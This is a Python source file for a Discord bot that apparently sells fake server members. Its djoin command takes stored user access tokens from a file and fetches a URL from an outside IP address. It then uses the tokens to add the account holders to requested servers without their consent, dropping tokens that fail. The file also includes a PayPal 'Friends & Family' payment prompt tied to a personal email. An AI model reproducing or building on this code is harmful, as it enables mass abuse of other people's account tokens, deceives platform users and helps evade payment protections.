import discord, requests, threading, random, time, ctypes, datetime, asyncio, json, os
from discord.ext import commands
from discord.ext.commands import cooldown, BucketType
from discord.utils import get
from discord_buttons_plugin import *


ctypes.windll.kernel32.SetConsoleTitleW(f'charge')

prefix = '!'
admins = [1183923452965552169, 987118419830767626, 1175412474489610351]
commandchannel = 1175190775768830143
logs = 1175191081449689159
addbot = 1175214311166181406
blacklist_log = 1175246115931688960
verifybot_token = 'token'

queue = []
guild_cooldown = []
queue1 = 1

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, help_command=None, intents=intents)
buttons = ButtonsClient(bot)

def add_queue():
    global queue1
    while True:
        time.sleep(0.1)
        try:
            if queue == []:
                pass
            else:
                info=str(queue[0]).split('::')
                type = info[0]
                if str(type) == 'djoin':
                    guildid = info[1]
                    amount = info[2]
                    for i in range(int(amount)):
                        threading.Thread(target=join(guildid, amount))
                    queue.pop(0)
                    queue1 -=1
                    pass
        except Exception as e:
            print(e)

@bot.event
async def on_command_error(ctx, error: Exception):
    if ctx.channel.id == commandchannel:
        if isinstance(error, commands.MissingRequiredArgument):
            embed=discord.Embed(title='**Error**', description=f'You are missing arguments to run this command.', color=0x206694)
            embed.timestamp = datetime.datetime.now()
            embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
            await ctx.reply(embed=embed, mention_author=False)

@bot.command()
async def djoin(ctx, guildid, amount: int=None):
    global queue1
    if ctx.channel.id == commandchannel:
        headers = {
            'user-agent': 'BDP (http://example.com), v0.0.1)',
            'authorization': f'Bot {verifybot_token}',
        }
        r = requests.get(f'https://discord.com/api/v9/guilds/{guildid}', headers=headers)
        if 'Invalid Form Body' in r.text:
            embed=discord.Embed(title='**Error**', description=f'**{guildid}**, is not a valid server.', color=0x206694)
            embed.timestamp = datetime.datetime.now()
            embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
            await ctx.reply(embed=embed, mention_author=False)
        else:
            if os.path.getsize('db.txt') == 0:
                embed=discord.Embed(title='**Error**', description=f'The bot has no accounts left wait for restock.', color=0x206694)
                embed.timestamp = datetime.datetime.now()
                embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                await ctx.reply(embed=embed, mention_author=False)
            else:
                if str(guildid) in guild_cooldown:
                    embed=discord.Embed(title='**Error**', description=f'**{guildid}**, was recently used?', color=0x206694)
                    embed.timestamp = datetime.datetime.now()
                    embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                    await ctx.reply(embed=embed, mention_author=False)
                else:
                    if queue1 >15:
                        embed=discord.Embed(title='**Error**', description=f'The bot queue is too long, try again soon.', color=0x206694)
                        embed.timestamp = datetime.datetime.now()
                        embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                        await ctx.reply(embed=embed, mention_author=False)
                    else:
                        blacklist = open('blacklisted.txt', 'r').read()
                        if guildid in blacklist:
                            embed=discord.Embed(title='**Error**', description=f'**{guildid}**, is blacklisted.', color=0x206694)
                            embed.timestamp = datetime.datetime.now()
                            embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                            await ctx.reply(embed=embed, mention_author=False)
                        else:
                            channel = bot.get_channel(addbot)
                            headers = {
                                'user-agent': 'BDP (http://example.com), v0.0.1)',
                                'authorization': f'Bot {verifybot_token}',
                            }
                            r = requests.get(f'https://discord.com/api/v9/guilds/{guildid}', headers=headers)
                            if 'Unknown Guild' in r.text:
                                embed=discord.Embed(title='**Error**', description=f'The bot is not in your server. Check out {channel.mention}', color=0x206694)
                                embed.timestamp = datetime.datetime.now()
                
                                embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                                await ctx.reply(embed=embed, mention_author=False)
                            else:
                                max_amount = 3
                                bronze = discord.utils.get(ctx.guild.roles, name='Bronze')
                                if bronze in ctx.author.roles:
                                    max_amount = 5
                                silver = discord.utils.get(ctx.guild.roles, name='Silver')
                                if silver in ctx.author.roles:
                                    max_amount = 10
                                gold = discord.utils.get(ctx.guild.roles, name='Gold')
                                if gold in ctx.author.roles:
                                    max_amount = 20
                                premium = discord.utils.get(ctx.guild.roles, name='Premium')
                                if premium in ctx.author.roles:
                                    max_amount = 35
                                if amount is None:
                                    amount = max_amount
                                elif amount > max_amount:
                                    amount = max_amount
                                if amount <= max_amount:

                                    embed=discord.Embed(title='**Discord Members**', description=f'Adding **{amount}** Discord Members to `{guildid}`', color=0x206694)
                                    embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                                    embed.add_field(name='`Queue`', value=f'You are position **{queue1}/15** in the queue.', inline=True)
                                    embed.timestamp = datetime.datetime.now()
                                    #embed.add_field(name='Requested By:', value=f'{ctx.author.mention}', inline=True)
                                    await ctx.reply(embed=embed, mention_author=False)
                                    logembed = embed=discord.Embed(title=f'**Logs**', description=f'{ctx.author.mention}, sent **{amount}** members to **{guildid}** | Queue: **{queue1}**', color=0x206694)
                                    embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                                    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                                    embed.timestamp = datetime.datetime.now()
                                    await ctx.guild.get_channel(logs).send(embed=logembed)
                                    queue.append('{}::{}::{}'.format('djoin',guildid,int(amount)))
                                    queue1 +=1
                                    guild_cooldown.append(str(guildid.lower()))
                                    await asyncio.sleep(115)
                                    guild_cooldown.remove(str(guildid.lower()))
    else:
        await ctx.message.delete()

@bot.command()
async def add(ctx):
    embed = discord.Embed(title=f'**Bot Invite** \n', color=0x206694,description = 'Click the "Add Bot" button to add the bot to your server.')
    server = ctx.guild.id
    await buttons.send(
        content = None,
        embed = embed,
        channel = ctx.channel.id,
        components = [
            ActionRow([
                Button(
                    style = ButtonType().Link,
                    label = 'Add Bot',
                    url = f'https://discord.com/api/oauth2/authorize?client_id=1186454251245940746&permissions=8&scope=bot'
                )
            ])
        ]
    )

@bot.command()
async def blacklist(ctx, guildid, *, reason):
    if ctx.author.id in admins:
        blacklist1 = open('blacklisted.txt', 'r').read()
        if guildid in blacklist1:
            embed=discord.Embed(title='**Error**', description=f'**{guildid}** is already blacklisted.', color=0x206694)
            embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
            embed.timestamp = datetime.datetime.now()
            await ctx.send(embed=embed, mention_author=False)
        else:
            with open('blacklisted.txt', 'a') as f:
                f.write(f'{guildid}\n')
                embed=discord.Embed(title='**Blacklist**', description=f'Blacklisted **{guildid}**.\n\n Reason: {reason}', color=0x206694)
                embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                embed.timestamp = datetime.datetime.now()
                await ctx.send(embed=embed, mention_author=False)
                message = str(guildid)
                await ctx.guild.get_channel(blacklist_log).send(message)
                embed=discord.Embed(title='**Blacklist**', description=f'{ctx.author.mention}, blacklisted **{guildid}**\n\n Reason: {reason}', color=0x206694)
                embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                embed.timestamp = datetime.datetime.now()
                await ctx.guild.get_channel(blacklist_log).send(embed=embed)  
    else:
        await ctx.message.delete()

@bot.command()
async def paypal(ctx, amount):
    if ctx.author.id in admins:
        await ctx.message.delete()
        embed=discord.Embed(title='`Paypal`', description=f'**oemnraven@gmail.com**', color=0x206694)
        embed.add_field(name='`Method`', value=f'**Friends & Family.**', inline=True)
        embed.add_field(name='`Amount`', value=f'**${amount}.**', inline=True)
        embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1010853154600005692/1024494395057254430/paypal_PNG7.png')
        #embed.set_footer(text='Made by discord.gg/charge')
        await ctx.send(embed=embed, mention_author=False)
    else:
        await ctx.message.delete()

@bot.command()
async def stock(ctx):
    if ctx.author.id in admins:
        try:
            with open('db.txt', 'rbU') as f:
                num_lines = sum(1 for _ in f)
                embed=discord.Embed(title='**Stock**', description=f'**{num_lines}** valid accounts in the bot.', color=0x206694)
                embed.set_footer(text='Powered by .gg/members', icon_url='https://cdn.discordapp.com/attachments/1137358906998399007/1138171501984616528/discord_members-removebg-preview.png')
                embed.timestamp = datetime.datetime.now()
                await ctx.send(embed=embed, mention_author=False)
        except:
            pass
        
def join(guildid, amount):

    time.sleep(0.8)

    userid = open('db.txt', 'r').read().splitlines()
    userid = random.choice(userid)
    token = userid.split(':')[0]
    useridd = userid.split(':')[1]

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0",
        "AcceptCM": f"{guildid}:{useridd}",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    r = requests.get('http://107.172.148.227:6969/flynny', headers=headers)
    url = r.text

    botToken = f'{verifybot_token}'

    data = {
        'access_token' : f'{token}'
    }
    headers = {
        'Authorization' : f'Bot {botToken}',
        'Content-Type': 'application/json'
    }
    r = requests.put(url=url, headers=headers, json=data)
    print(r.text)

    if '50025' in r.text:
        removeid(userid)
    elif '30001' in r.text:
        removeid(userid)
    elif '50178' in r.text:
        removeid(userid)
    elif '10013' in r.text:
        removeid(userid)
    elif '50178' in r.text:
        removeid(userid)

def removeid(userid):
    with open('db.txt', 'r') as f:
        lines = f.readlines()
    with open('db.txt', 'w') as f:
        for line in lines:
            if line.strip('\n') != userid:
                f.write(line)

threading.Thread(target=(add_queue)).start()
bot.run('')